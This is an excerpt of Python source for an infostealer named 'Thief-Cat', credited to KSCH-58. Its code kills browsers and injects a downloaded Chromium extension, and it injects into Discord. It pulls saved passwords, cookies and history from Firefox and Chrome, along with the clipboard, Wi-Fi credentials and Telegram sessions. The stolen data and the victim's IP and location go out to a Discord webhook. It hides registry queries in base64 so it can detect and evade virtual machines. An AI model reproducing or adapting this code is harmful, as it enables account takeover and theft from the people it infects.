...
NotKSCH58 = base64.b64decode(b'VGhpZWYtQ2F0').decode()
...
lilcorereg = f'{base64.b64decode("UkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXERyaXZlckRlc2MgMj4gbnVs")}'.replace("b'", "").replace("'", "")
anotherreg = f'{base64.b64decode("UkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXFByb3ZpZGVyTmFtZSAyPiBudWxs")}'.replace("b'", "").replace("'", "")
justakeyreg = f'{base64.b64decode("U1lTVEVNXFxDdXJyZW50Q29udHJvbFNldFxcU2VydmljZXNcXERpc2tcXEVudW0=")}'.replace("b'", "").replace("'", "")
...
json_confg = {
    ...
    "url_hawkinject": "https://raw.githubusercontent.com/meccksch/cerf/main/index.js",
...
class NotKSCH58_first_funct(Functions):
    ...
    def ping_on_running(self: str) -> str:
        ...
        try:
            ping1 = {
                ...
                "avatar_url": f"https://raw.githubusercontent.com/meccksch/cerf/main/assets/thiefcat.png",
                "content": "@everyone",
            }
            ping2 = {
                "username": f"{NotKSCH58} ",
    ...
    def thiecat_burnthisprocess(self, prccsss):
        for Procss in psutil.process_iter():
            try:
                if Procss.name() == prccsss:
                    Procss.kill()
        ...
        try:
            for browser, process_name in self.browser_processes.items():
                if process_name in (p.name() for p in psutil.process_iter()):
                    self.thiecat_burnthisprocess(process_name)

                    
            extensions = {
                'extensions': f'https://github.com/KSCH-58/Chromium-Injection/raw/main/extensions.zip'
            }
        ...
        try:
            ...
            for discord_path in discord_paths:
                ...
                for app_path in app_paths:
                    ...
                    for injpt58 in injpt58s:
                        for root, dirs, files in os.walk(injpt58):
        ...
        try:
            ...
            with open(config, "r", errors="ignore") as f:
                try:
                    ...
                    return
            item[f"{NotKSCH58}_is_here"] = f"https://github.com/KSCH-58"
            ...
            with open(config, "w") as f:
                ...
                f.write(f"\n\n//{NotKSCH58}_is_here | https://github.com/KSCH-58")
        except:
            pass
    ...
    def fetch_firefox_credit_cards(self, profile_path):
        ...
        try:
            cursor.execute("SELECT hostname FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0")
            hostnames_result = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        
        try:
            cursor.execute("SELECT username FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0")
            usernames_result = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        
        try:
            cursor.execute("SELECT password FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0")
            passwords_result = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        finally:
            cursor.close()
        ...
        credit_cards_data = list(zip(hostnames_result, usernames_result, passwords_result))
    ...
    def fetch_firefox_data(self, profile_path):
        ...
        try:
            ...
            return ""
        try:
            cursor.execute("SELECT host, isSecure, path FROM moz_cookies")
            data_part1 = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        try:
            cursor.execute("SELECT isHttpOnly, expiry FROM moz_cookies")
            data_part2 = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        try:
            cursor.execute("SELECT name, value FROM moz_cookies")
            data_part3 = cursor.fetchall()
        except sqlite3.Error as e:
            return ""
        finally:
            cursor.close()
        ...
        for i in range(len(data_part1)):
            data_combined.append(data_part1[i] + data_part2[i] + data_part3[i])
        data_str = ""
    ...
    def fetch_firefox_history(self, profile_path):
        ...
        os.makedirs(directory, exist_ok=True)
        with open(os.path.join(self.dir, "Firefox", "Histories.txt"), "w", encoding="utf-8") as file:
        ...
        try:
            ...
            try:
                ...
                with open(os.path.join(self.dir, "Browsers", "Passwords.txt"), "a", encoding="utf-8") as f:
                    sql_query_1 = "SELECT origin_url, username_value FROM logins"
                    ...
                    sql_query_2 = "SELECT password_value FROM logins"
            ...
            with open(os.path.join(self.dir, "Google", f"{justaterm}.txt"), "w", encoding="cp437", errors="ignore") as f:
                for prof in os.listdir(self.chrome_user_path):
                    if re.match(self.rgx_chrome, prof):
                        ...
                        cursor = conn.cursor()
                        sql_query_part1 = "SELECT host_key,"
                        sql_query_part2 = "name"
                        sql_query_part3 = f"from {justatermlil}"
                        sql_query_part4 = "SELECT encrypted_value FROM {justatermlil}"
                        cursor.execute(f"{sql_query_part1} {sql_query_part2} {sql_query_part3}")
                        ...
                        while True:
                            ...
                            for r in rows:
                                host, user = r
                        cursor.execute(sql_query_part4)
                        while True:
                            rows = cursor.fetchmany(50)
                            if not rows:
                                break
                ...
                for prof in os.listdir(self.chrome_user_path):
                    if re.match(self.rgx_chrome, prof):
                        ...
                        with sqlite3.connect(login) as conn:
                            ...
                            for r1, r2 in zip(data_part1, data_part2):
                                url, username = r1
                                encrypted_password = r2[0]
    ...
    def thiefcat_browsers2(self, name: str, path: str, profile: str):
        ...
        try:
            ...
            cursor = conn.cursor()
            with open(
                os.path.join(self.dir, "Browsers", "Histories.txt"), "a", encoding="utf-8", ) as f:
                sites = []
    ...
    def thiefcat_GetGoogle3(self):
        if self.Found_Browsers != "yes":
            return
        try:
            with open(os.path.join(self.dir, "Google", "Histories.txt"), "w", encoding="cp437", errors="ignore") as f:
        ...
        try:
            ...
            if output:
                with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(
                        f"{NotKSCH58} | https://github.com/KSCH-58/{NotKSCH58}\n\n" + output)
        except:
            pass
    ...
    def thiefcat_GetWifi(self):
        ...
        try:
            ...
            divider = f'\n\n{NotKSCH58} | https://github.com/KSCH-58/{NotKSCH58}\n\n'
    ...
    def thiefcat_GetTLGSession(self):
                ...
                for path in paths:
                    ...
                    if process.returncode == 0:
                        ...
                        if "telegram" in path.lower():
                            tlgpath.append(os.path.dirname(path))
            if not tlgpath:
                tlgpath.append(os.path.join(roaming, "Telegram Desktop"))
            for path in tlgpath:
                path = os.path.join(path, "tdata")
                if os.path.isdir(path):
                    for item in os.listdir(path):
                        itmpath = os.path.join(path, item)
                        if item == "key_datas":
                            doeshehavekey = True
                            logpaths.append(itmpath)

                        if os.path.isfile(itmpath):
                            find.append(item)
                        else:
                            logpaths.extend([os.path.join(itmpath, x) for x in os.listdir(itmpath)])
            if doeshehavekey and len(logpaths) > 1:
                    ...
                    with open(path, "r", errors="ignore") as ff:
                        ...
                        if not x:
                            ...
                            with open(path, "w", encoding="utf-8", errors="ignore") as f:
                                f.write(
                                    f"{NotKSCH58} Create By KSCH-58 | https://github.com/KSCH-58\n\n"
                                )
                            with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                                fp.write(
                                    x
                                    + f"\n\n{NotKSCH58} Create By KSCH-58 | https://github.com/KSCH-58"
                                )
                ...
                "embeds": [
                    {
                        "author": {
                            "name": f"{NotKSCH58} v9 ",
                            "url": f"https://github.com/KSCH-58",
                            "icon_url": f"https://raw.githubusercontent.com/meccksch/cerf/main/assets/d95it6h-ceaa1da3-727a-402f-8061-9a0a8e68af13.gif",
                        },
                        "color": 4873727,
                        "description": f"[{NotKSCH58} ON TOP <a:thiefcat:1125732578419290122>]({self.googlemap})",
                        "fields": [
                            {
                                "name": "\u200b",
                                "value": f"""```ansi
[2;31mIP:[0m {self.ip if self.ip else "N/A"}
[2;31mOrg:[0m {self.org if self.org else "N/A"}
[2;31mCity:[0m {self.city if self.city else "N/A"}
[2;31mRegion:[0m {self.region if self.region else "N/A"}
[2;31mCountry:[0m {self.country if self.country else "N/A"} 
```
                                """.replace(
                                    " ", " "
                                ),
...
{tokens[:2000] if tokens else "tokens not found"}```
        """.replace(" ", ""),
                        ...
                        "footer": {
                            "text": f"{NotKSCH58} Create BY KSCH-58・https://github.com/KSCH-58"
                        },
                    }
                ],
            }
            try:
                ...
                link = await self.Upload_Path(f"{self.getlange(self.pc_codewinl)}THIEFCAT_{imthebestdev}.zip", _zipfile)
...
class AntiDebugg(Functions):
    ...
    def keys_regex(self):
        ...
        if (first_reg and sec_reg) != 1:
            self.programExit()
        simphand = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, justakeyreg
        )
        try:
            value_reg = winreg.QueryValueEx(simphand, "0")[0]
            if ("VMware" or "VBOX") in value_reg:
                self.programExit()
        finally:
            winreg.CloseKey(simphand)
